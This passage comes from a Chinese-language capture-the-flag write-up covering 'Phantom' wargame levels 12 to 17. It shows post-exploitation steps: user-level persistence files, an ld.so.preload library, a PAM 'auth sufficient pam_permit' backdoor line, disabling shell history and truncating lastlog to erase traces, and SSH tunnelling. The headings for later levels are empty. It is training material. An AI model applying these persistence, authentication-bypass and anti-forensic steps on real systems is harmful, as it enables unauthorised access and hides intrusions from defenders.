```shell
phantom11@phantom:/opt/webapp/repo/.git$ ls -laih /home/svc_webapp/.aws/
total 24K
1205277 drwxr-xr-x 1 root       root       4.0K Apr 22 21:38 .
1850970 drwxr-xr-x 1 svc_webapp svc_webapp 4.0K Apr 22 21:38 ..
1205278 -rw-r--r-- 1 root       root        135 Apr 22 21:38 credentials
phantom11@phantom:/opt/webapp/repo/.git$ cat /home/svc_webapp/.aws/credentials 
[default]
aws_access_key_id = AKIAIOSFODNN7EXAMPLE
aws_secret_access_key = wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
region = us-east-1
```

不像，尝试分析那个 repo

```shell
tar -cvzf /tmp/repo_backup.tar.gz /opt/webapp/repo
```

获取到本地进行分析

![img](img/image_20260400-110000.png)

## 12 Ghost Install

```plaintext
 [ Phantom · Level 12 ]  Ghost Install
 Full brief:  cat ~/BRIEFING
 ─────────────────────────────────────────────
 If you're stuck — read up on the topic, then come back:
   https://man.openbsd.org/sshd.8
   https://man7.org/linux/man-pages/man5/crontab.5.html
   https://man7.org/linux/man-pages/man5/systemd.service.5.html
```

查看说明

```plaintext title="BRIEFING"
MISSION: Ghost Install
=====================

Install four independent USER-LEVEL persistence mechanisms in
your own home directory. Each must survive a reboot AND a logout.

No sudo. No root. Real operator tradecraft — user-level persistence
is how adversaries stay under root-level detection.

Each artefact you drop must contain the string "phantom-ghost-install"
somewhere in its body, so the scorer can tell your operator-planted
files apart from shell defaults.

Surfaces you have access to (non-exhaustive):
  - ~/.ssh/authorized_keys  (user-level SSH backdoor)
  - user crontab (crontab -e)
  - ~/.config/systemd/user/  (user systemd services)
  - ~/.bashrc, ~/.profile, ~/.bash_login  (shell rc hijack)
  - ~/bin/ + PATH prepend in ~/.bashrc  (binary shim)

Pick any four. When ready, run /opt/verify-persistence.sh.
```

简单

```shell
# 01
phantom12@phantom:~$ mkdir -p ~/.ssh
phantom12@phantom:~$ chmod 700 ~/.ssh
phantom12@phantom:~$ echo "# phantom-ghost-install" >> ~/.ssh/authorized_keys
phantom12@phantom:~$ chmod 600 ~/.ssh/authorized_keys
phantom12@phantom:~$ cat ~/.ssh/authorized_keys 
# phantom-ghost-install

# 02
phantom12@phantom:~$ crontab -e
......
* * * * * # phantom-ghost-install

# 03
phantom12@phantom:~$ mkdir -p ~/.config/systemd/user/
phantom12@phantom:~$ cat <<EOF > ~/.config/systemd/user/ghost.service
[Unit]
Description=Ghost Service phantom-ghost-install

[Service]
ExecStart=/bin/sleep 1000

[Install]
WantedBy=default.target
EOF

# 04
phantom12@phantom:~$ echo "# Persistence check: phantom-ghost-install" >> ~/.profile
```

然后提交结果

```shell
phantom12@phantom:~$ /opt/verify-persistence.sh 
[*] Verifying USER-LEVEL persistence mechanisms in /home/phantom12 ...

[+] User SSH authorized_keys: INSTALLED (marker present)
[+] User crontab: INSTALLED
[+] User systemd service: INSTALLED
[+] Shell rc hijack: INSTALLED

[*] Score: 4/4

[*] FLAG: bl_phtm12_**hidden**
[*] Use this as the password for phantom13.
```

## 13 Deep Roots

```plaintext
 [ Phantom · Level 13 ]  Deep Roots
 Full brief:  cat ~/BRIEFING
 ─────────────────────────────────────────────
 If you're stuck — read up on the topic, then come back:
   https://man7.org/linux/man-pages/man5/ld.so.preload.5.html
   http://www.linux-pam.org/Linux-PAM-html/
   https://attack.mitre.org/techniques/T1546/004/
```

查看说明

```plaintext title="BRIEFING"
phantom13@phantom:~$ cat BRIEFING 
MISSION: Deep Roots
===================

Basic persistence is easy to find. Go deeper.

Install three stealth mechanisms that would survive a basic
security audit, each exercising a different Linux subsystem.

The verifier is marker-graded, not technique-graded — every
artefact must carry the string "phantom-deep-roots" somewhere
in its body. Distro-shipped references to the same Linux
primitives exist on every Ubuntu image; the marker is how the
scorer tells your work apart from the defaults.

When ready, run /opt/verify-deep-roots.sh.
```

有难度，分批次来实现

首先具有权限

```shell
phantom13@phantom:~$ sudo -l
Matching Defaults entries for phantom13 on phantom:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User phantom13 may run the following commands on phantom:
    (ALL) NOPASSWD: ALL
```

第一步 `/etc/ld.so.preload`

```c title="rootkit.c"
#include <stdio.h>

const char *marker = "phantom-deep-roots";

void __attribute__((constructor)) init() {

    // printf("phantom-deep-roots");
}
```

```shell
phantom13@phantom:/tmp$ gcc -fPIC -shared -o /tmp/rootkit.so rootkit.c

# 种植
phantom13@phantom:/tmp$ cat /etc/ld.so.preload
/tmp/rootkit.so
```

检查

```shell
phantom13@phantom:/tmp$ /opt/verify-deep-roots.sh
[*] Verifying deep persistence mechanisms...

[+] LD_PRELOAD persistence: INSTALLED (/tmp/rootkit.so carries marker)
[-] PAM backdoor: NOT FOUND
    Add a line like: auth sufficient pam_permit.so  # phantom-deep-roots
[-] Alias injection: NOT FOUND
    Drop an alias into /etc/bash.bashrc or /etc/profile.d/*.sh
    whose line carries the marker comment '# phantom-deep-roots'

[*] Score: 1/3

[!] Install all 3 stealth mechanisms with the 'phantom-deep-roots' marker
[!] and re-run.

[!] need 3 stealth mechanisms, got 1
```

第二步 `/lib/x86_64-linux-gnu/security/`

```c title="pam_permit.c"
const char *marker = "phantom-deep-roots";
```

种植

```shell
phantom13@phantom:/tmp$ gcc -fPIC -shared -o pam_permit.so pam_permit.c
phantom13@phantom:/tmp$ sudo mv /tmp/pam_permit.so /lib/x86_64-linux-gnu/security/pam_permit.so
phantom13@phantom:/tmp$ sudo nano /etc/pam.d/common-auth
auth sufficient /tmp/pam_permit.so  # phantom-deep-roots
```

第三步 `/etc/profile.d/`

```shell
echo 'alias cls=clear # phantom-deep-roots' > /etc/profile.d/deeproots.sh
chmod +x /etc/profile.d/deeproots.sh
```

即可通过

```shell
phantom13@phantom:/tmp$ /opt/verify-deep-roots.sh
[*] Verifying deep persistence mechanisms...

[+] LD_PRELOAD persistence: INSTALLED (/tmp/rootkit.so carries marker)
[+] PAM backdoor: INSTALLED (auth/account pam_permit line with marker)
[+] Alias injection: INSTALLED

[*] Score: 3/3

[*] FLAG: bl_phtm13_**hidden**
[*] Use this as the password for phantom14.
```

## 14 Shadow Mode

```plaintext
 [ Phantom · Level 14 ]  Shadow Mode
 Full brief:  cat ~/BRIEFING
 ─────────────────────────────────────────────
 If you're stuck — read up on the topic, then come back:
   https://man7.org/linux/man-pages/man7/auditd.7.html
   https://man7.org/linux/man-pages/man1/bash.1.html  (SHELL BUILTINS)
   https://tldp.org/LDP/abs/html/io-redirection.html
```

查看说明

```plaintext title="BRIEFING"
MISSION: Shadow Mode
===================

You have sudo. The flag is at /root/shadow_flag.

A forensic investigator will audit your shell history and the
audit trail for loud file-read tools invoked against the flag.
Your job is to prove you read it WITHOUT leaving that kind of
trace.

Demonstrate the read by writing the flag contents to
/tmp/shadow_copy. /opt/verify-shadow.sh will check:
  - /tmp/shadow_copy matches /root/shadow_flag, AND
  - your ~/.bash_history contains no invocation of cat, head,
    tail, less, more, awk, sed, strings, xxd, od, or base64
    that references shadow_flag or shadow_copy.

Operating under monitoring is the reality of every modern
network. Think shell builtins, not separate programs.
```

简单

```shell
phantom14@phantom:~$ set +o history
phantom14@phantom:~$ sudo cat /root/shadow_flag
bl_phtm14_**hidden**
```

## 15 Clean Slate

```plaintext
 [ Phantom · Level 15 ]  Clean Slate
 Full brief:  cat ~/BRIEFING
 ─────────────────────────────────────────────
 If you're stuck — read up on the topic, then come back:
   https://man7.org/linux/man-pages/man5/utmp.5.html
   https://attack.mitre.org/techniques/T1070/
```

查看说明

```plaintext title="BRIEFING"
MISSION: Clean Slate
===================

You compromised this box. Now erase every trace.

An investigator will check:
- /var/log/auth.log — your SSH logins
- /var/log/wtmp — login records (last command)
- /var/log/btmp — failed logins
- ~/.bash_history — your command history
- File timestamps — did you touch anything?
- /var/log/audit/ — auditd records

1. First, read /root/clean_flag
2. Then erase EVERY trace of your presence
3. Run /opt/verify-clean.sh to check your work
```

虽然题目脚本检查的很多，但是由于默认干净环境，导致没的擦除

```shell
phantom15@phantom:~$ /opt/verify-clean.sh
[*] Forensic investigation in progress...

[+] auth.log: CLEAN
[+] wtmp: CLEAN
[+] btmp: CLEAN
[+] bash_history: CLEAN
[+] audit.log: CLEAN
[!] TRACE: login recorded in lastlog

[!] 1 trace(s) found. An investigator would catch you.

[!] 1 forensic trace(s) found
```

所以只需要

```shell
phantom15@phantom:~$ sudo truncate -s 0 /var/log/lastlog
phantom15@phantom:~$ /opt/verify-clean.sh
[*] Forensic investigation in progress...

[+] auth.log: CLEAN
[+] wtmp: CLEAN
[+] btmp: CLEAN
[+] bash_history: CLEAN
[+] audit.log: CLEAN
[+] lastlog: CLEAN

[*] Zero traces found. Perfect cleanup.

[*] FLAG: bl_phtm15_**hidden**
[*] Use this as the password for phantom16.
```

## 16 The Tunnel

```plaintext
 [ Phantom · Level 16 ]  The Tunnel
 Full brief:  cat ~/BRIEFING
 ─────────────────────────────────────────────
 If you're stuck — read up on the topic, then come back:
   https://man.openbsd.org/ssh  (see: -L, -R, -D, -J, -N)
   https://www.ssh.com/academy/ssh/tunneling
```

查看说明

```plaintext title="BRIEFING"
MISSION: The Tunnel
==================

You are on the entry host (10.13.37.2) of phantom-net (10.13.37.0/24).
The flag for this level is served by an HTTP service on 10.13.37.30.
The service is bound to loopback only — direct TCP from this host will
be refused.

Materials:
  ~/.ssh/id_ed25519_ops    — private key for ops@10.13.37.30

SSH is more than a login shell. Read the options on the client side and
figure out how to reach a loopback-bound service through a bastion you
already own.
```

虽然要打隧道，但是可以直接上去看

```shell
phantom16@phantom:~$ ssh -i ~/.ssh/id_ed25519_ops -L 8080:127.0.0.1:8080 ops@10.13.37.30  
```

获取服务代码

```python title="/opt/tunnel-flag-service.py"
#!/usr/bin/env python3
"""Level 16 flag service on mgmt — bound to 127.0.0.1 ONLY.

The whole point is that this port is unreachable from the phantom host
directly. The player must either (a) SSH to mgmt and curl locally, or
(b) set up `ssh -L 8080:127.0.0.1:8080 ops@10.13.37.30` and curl through
the forward. Option (b) is the lesson the level is named after.
"""
from http.server import BaseHTTPRequestHandler, HTTPServer

# L16 flag is loaded from /root/phantom-flags/tunnel (0600 root) at
# startup so the literal does not sit in a mode-0755 script on /opt.
# This service runs as root via /start.sh.
with open("/root/phantom-flags/tunnel", "r", encoding="utf-8") as _fh:
    FLAG = _fh.read().strip()


class Handler(BaseHTTPRequestHandler):
    def log_message(self, *_):  # silent
        pass

    def do_GET(self):
        if self.path in ("/", "/flag", "/level16"):
            body = f"{FLAG}\n".encode()
            self.send_response(200)
            self.send_header("Content-Type", "text/plain")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)
            return
        self.send_response(404)
        self.end_headers()


if __name__ == "__main__":
    # 127.0.0.1 only — never 0.0.0.0. This is the point of the level.
    HTTPServer(("127.0.0.1", 8080), Handler).serve_forever()
```

那么就简单了

```shell
ops@mgmt-srv:~$ curl 127.0.0.1:8080
bl_phtm16_9fd69ae362fefb73
```

## 17 Internal Hunt

```plaintext
 [ Phantom · Level 17 ]  Internal Hunt
 Full brief:  cat ~/BRIEFING
 ─────────────────────────────────────────────
 If you're stuck — read up on the topic, then come back:
   https://nmap.org/book/man.html
   https://redis.io/docs/management/security/
   https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis
```

查看说明

```plaintext title="BRIEFING"
MISSION: Internal Hunt
====================

Scan the internal network (10.13.37.0/24).

One neighbour runs a service that shipped without authentication and
is happy to write to the local disk. Abuse that into a shell as the
service host user, then pick up the flag from their home.

Targets: 10.13.37.10, 10.13.37.20, 10.13.37.30.
```

## 18 Credential Spray

```plaintext
```

查看说明

```plaintext title="BRIEFING"
```

## 19 Chain Reaction

```plaintext
```

查看说明

```plaintext title="BRIEFING"
```

## 20 Am I Contained?

```plaintext
```

查看说明

```plaintext title="BRIEFING"
```

## 21 The Breakout

```plaintext
```

查看说明

```plaintext title="BRIEFING"
```

## 22 Leaky Vessels

```plaintext
```

查看说明

```plaintext title="BRIEFING"
```

## 23 Docker API

```plaintext
```

查看说明

```plaintext title="BRIEFING"
```

## 24 Pod Games

```plaintext
```

查看说明

```plaintext title="BRIEFING"
```

## 25 Cluster Takeover

```plaintext
```

查看说明

```plaintext title="BRIEFING"
```

## 26 Cloud Reach

```plaintext
```

查看说明

```plaintext title="BRIEFING"
```

## 27 Toolsmith

```plaintext
```

查看说明

```plaintext title="BRIEFING"
```

## 28 The Heist

```plaintext
```

查看说明

```plaintext title="BRIEFING"
```

## 29 Wire Tap

```plaintext
```

查看说明

```plaintext title="BRIEFING"
```

## 30 Clean Exit

```plaintext
```

查看说明

```plaintext title="BRIEFING"
```

##

```plaintext
```

查看说明

```plaintext title="BRIEFING"
```
